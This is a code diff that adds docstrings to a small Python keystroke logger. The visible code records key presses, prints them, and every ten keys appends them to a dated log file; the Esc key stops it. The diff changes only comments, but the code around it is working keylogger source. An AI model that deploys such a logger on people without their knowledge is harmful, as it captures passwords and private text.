@@ -7,12 +7,12 @@ keys = []
 
 
 def on_press(key):
+    """Reset the `count` to zero, and transfer the data in `keys` while clearing the list."""
     global keys, count
     keys.append(key)
     count += 1
     print(f"{key} pressed")
 
-    # Empty the `keys` list and reset the `count` to zero while transfering the data to the file
     if count >= 10:
         count = 0
         write_file(keys)
@@ -20,6 +20,7 @@ def on_press(key):
 
 
 def write_file(keys):
+    """Save the keystrokes to a textfile with `log_YYYY-MM-DD.txt` format."""
     with open(f"log_{datetime.today().strftime('%Y-%m-%d')}.txt", "a") as file:
         for key in keys:
             k = str(key).replace("'", "\n")
@@ -30,6 +31,7 @@ def write_file(keys):
 
 
 def on_release(key):
+    """Kill the program on hitting the `Esc` button."""
     if key == Key.esc:
         return False
 
